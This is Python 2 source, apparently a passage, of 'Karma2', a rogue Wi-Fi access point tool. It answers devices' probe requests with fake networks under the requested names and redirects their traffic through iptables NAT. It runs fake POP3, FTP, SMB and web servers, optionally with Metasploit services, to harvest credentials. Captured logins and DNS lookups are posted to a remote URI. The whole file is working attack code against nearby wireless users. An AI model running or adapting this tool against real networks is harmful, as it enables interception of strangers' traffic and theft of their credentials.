CERTFILE='./cert.pem'
KEYFILE='./key.pem'

from Queue import Queue
from src.SambaCrawler import *
from src.POP3Server import *
from src.FTPServer import *
from src.SMBServer import *
from src.Webserver import *
from src.AccessPoint import *
from src.Database import ClientsDatabase
from src.ServiceGuessr import ServiceGuessr

log_lock = Lock()
logfile = None
def log(message):
  with log_lock:
    message="%s  %s"%(time.strftime("%H:%M:%S"), message)
    print message
    if logfile is not None:
      message="%s  %s"%(time.strftime("%Y-%m-%d %H:%M:%S"), message)
      logfile.write("%s\n"%message)
      logfile.flush()

class Karma2(Thread):

  def __init__(self, args):
    Thread.__init__(self)
    self.probes_queue = Queue()
    self.logpath = args.logpath
    if not os.path.exists(self.logpath):
      os.mkdir(self.logpath)
    self.total_client_count = 0
    self.wpa = args.wpa
    self.ifmon = args.monitor
    self.ifgw = args.gateway
    virtual = 1
    if args.virtual is not None:
      virtual = args.virtual
    self.ifhostapds = WLANInterfaces(args.hostapds, virtual)
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.offline = args.offline
    self.tcpdump = args.tcpdump
    self.scan = args.scan
    self.debug = args.debug
    self.uri = args.uri
    self.forbidden_aps = args.forbidden
    self.KEYFILE = KEYFILE
    self.CERTFILE = CERTFILE
    self.args = args
    self.running = None

    self.ignore_bssid = []
    if args.ignore is not None:
      self.ignore_bssid = args.ignore[0]
    self.redirections = {}

    if not args.offline:
      self.setup_nat(self.ifgw)
    else:
      self.redirections[110] = 8110
      self.redirections[445] = 8445
      self.redirections[21] = 8021

    self.redirections[80] = 8080
    self.redirections[443] = 8081

    if args.redirections is not None:
      r = args.redirections.split(',')
      for re in r:
        sport, dport = re.split(':')
        self.redirections[int(sport)] = int(dport)
        
    if args.metasploit is not None:
      self.start_metasploit(args.metasploit)
    
    if args.database is not None:
      self.db = ClientsDatabase(self, args.database)
    else:
      self.db = ClientsDatabase(self)
    self.db.start()

    self.guessr = ServiceGuessr(self)

    self.version = self.get_version()

  def get_ignore_bssid(self):
    bssids = self.ignore_bssid[:]
    for i in self.getWirelessInterfacesList():
      bssids.append(self.getMacFromIface(i))
    return bssids

  def get_version(self):
    cmd = ['git','rev-parse','--short','HEAD']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read().strip('\n').strip()

  def log(self, message):
    log(message)
  
  def get_client_ap(self,ip):
    for iface,ap in self.aps.iteritems():
      for v in ap.virtuals:
        for m,c in v.clients.iteritems():
          if c['ip'] == ip:
            return ap

  def get_client_bssid(self, ip):
    for iface,ap in self.aps.iteritems():
      for v in ap.virtuals:
        for m,c in v.clients.iteritems():
          if c['ip'] == ip:
            return m
  
  def getMacFromIface(self, _iface):
      path = "/sys/class/net/%s/address"%_iface
      data = open(path,'r').read()
      data = data[0:-1] # remove EOL
      return data
  
  def update_login(self, login):
    if self.uri is None:
      return
    try:
      req = urllib2.Request('%s/users.json'%self.uri)
      req.add_header('Content-Type', 'application/json')
      response = urllib2.urlopen(req, json.dumps(login, ensure_ascii=False))
    except:
      log( "could not update login")
  
  def update_dns(self, dns):
    if 'bssid' in dns and 'host' in dns:
      self.guessr.feed_dns_request(dns['bssid'], dns['host'])
      self.db.new_service_request(dns['bssid'], 'DNS', dns['qtype'], dns['host'], '', '', True)

    if self.uri is None:
      return
    try:
      req = urllib2.Request('%s/users.json'%self.uri)
      req.add_header('Content-Type', 'application/json')
      response = urllib2.urlopen(req, json.dumps(dns, ensure_ascii=False))
    except:
      log( "could not update dns")
  
  def start_metasploit(self, console):
    log( "[+] Starting metasploit")
    cmd = [console,'-r', 'run_fake_services.rb']
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE)

  def clear_iptables(self):
    log( "[+] Clearing iptables rules")
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    log( "[+] Setting up NAT on %s"%iface)
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    a = self.subnets.pop()
    return IPSubnet("10.0.%d.%%d"%a)

  def free_subnet(self, subnet):
    self.subnets.add(subnet.base)
  
  def get_client_from_ip(self, ip):
    for iface, ap in self.aps.iteritems():
      c = ap.get_client_from_ip(ip)
      if c is not None:
        return c
    return None
  
  def get_client(self, bssid):
    for iface, ap in self.aps.iteritems():
      c = ap.get_client(bssid)
      if c is not None:
        return c
    return None
    
    
  def register_ap(self, iface, ap):
    self.aps[iface] = ap

  def release_ap(self, iface):
    self.aps.pop(iface)

  def create_mgmt_ap(self, iface):
    essid = "mgmt"
    ap = AccessPoint(self, 
      WLANInterface(iface),
      essid, None, 365*24*3600,
      wpa2="glopglopglop",
      fishing=False)
    ap.daemon = True
    ap.start()

  def create_aps(self, aps, timeout=30):
    while True:
      # fetch one interface
      iface = self.ifhostapds.get_one()
      if iface is None:
        break

      # get aps for this ap
      n = iface.available_ap # not implemented, always 1
      n = min(n, self.args.virtual)
      maps = aps[:n]
      aps = aps[n:]
      
      if maps == []:
        self.ifhostapds.free_one(iface)
        break
      self.create_ap(iface, maps, timeout)

  def create_ap(self, iface, aps, timeout=30):
    if iface is None:
      return
    if iface.available_ap >= len(aps):
      ap = AccessPoint(self, iface, aps, timeout)
      for v in ap.virtuals:
        self.register_ap(iface,ap)
      ap.daemon = True
      ap.start()
    else:
      log("Too many ap %s to create for this interface %s"%(len(essid), iface.str()))

  def process_probe(self, essid, bssid = None):
    self.probes_queue.put({
      'timestamp': time.time(),
      'bssid':bssid,
      'essid':essid
      })
  
  def stop(self):
    self.running = False
  
  def run(self):
    self.running = True
    while self.running:
      aps = []
      while not self.probes_queue.empty():
        keep = True
        p = self.probes_queue.get()
        for i,a in self.aps.iteritems():
          if p['essid'] in a.get_essids():
            keep = False
        if keep and not p['essid'] in self.forbidden_aps:
        
          wpa = None
          if args.wpa:
            wpa = "glopglopglop"
          ap = {
            'bssid':None,
            'essid': p['essid'],
            'wpa': wpa
            }
          aps.append(ap)
          
      if len(aps) > 0:
        self.create_aps(aps, 30)
      time.sleep(1)
  
  def getWirelessInterfacesList(self):
    networkInterfaces=[]		
    command = ["iwconfig"]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()
    (stdoutdata, stderrdata) = process.communicate();
    output = stdoutdata
    lines = output.splitlines()
    for line in lines:
      if(line.find("IEEE 802.11")!=-1):
        networkInterfaces.append(line.split()[0])
    return networkInterfaces
  
  def do_sniff(self):
    self.start()
    if self.ifmon is not None:
      if 'http' in self.ifmon:
        while True:
          data = None
          try:
            req = urllib2.Request("%s/status.json"%self.ifmon)
            f = urllib2.urlopen(req)
            data = f.read()
            j =  json.loads(data)
            for p in j['current']['probes']:
              bssid = None
              try:
                bssid = p['ap'][0][0]
              except:
                pass
              found = False
              for w in j['current']['wifis']:
                if p['essid'] == w['essid']:
                  found = True
                  break
              if not found:
                if not p['bssid'] in self.ignore_bssid:
                  self.process_probe(p['essid'], bssid)
          except Exception as e:
            log( "Probes %s"%e)
            try:
              f = open("/tmp/wifi-probes.json", 'w')
              f.write(data)
              f.close()
            except Exception as e:
              log("probes backup %s"%e)
          time.sleep(0.5)
      else:
        def _filter(packet):
          if packet.haslayer(Dot11ProbeReq):
            section = packet[Dot11ProbeReq][Dot11Elt]
            # SSID
            if section.ID == 0 and section.info != '':
              self.process_probe(section.info)
        
        sniff(prn=_filter,store=0)
    else:
      while True:
        time.sleep(1)

  def start_adminserver(self, km, port):
    aserver = AdminWebserver(km, port)
    aserver.start()

  def start_webserver(self, km, port, ssl_port):
    ws = Webserver(km, port)
    ws.start()
    wss = SSLWebserver(km, ssl_port)
    wss.start()

  def start_mailserver(self, km, pop3_port):
    pop = POP3Server(km,pop3_port)
    pop.start()

  def start_smbserver(self, km, smb_port):
    smb = SMBServer(km, smb_port)
    smb.start()

  def start_ftpserver(self, km, ftp_port):
    ftp = FTPServer(km, ftp_port)
    ftp.start()

  def status(self, signum, stack):
    print ">>"
    for essid,ap in self.aps.iteritems():
      print "%s => %s (%s), inactive for %ss/%ss"%(ap.ifhostapd.iface, ap.essid, len(ap.clients), int((time.time() - ap.activity_ts)), ap.timeout)
      for mac,ip in ap.clients.iteritems():
        print "\t%s => %s"%(mac,ip)
    print "<<"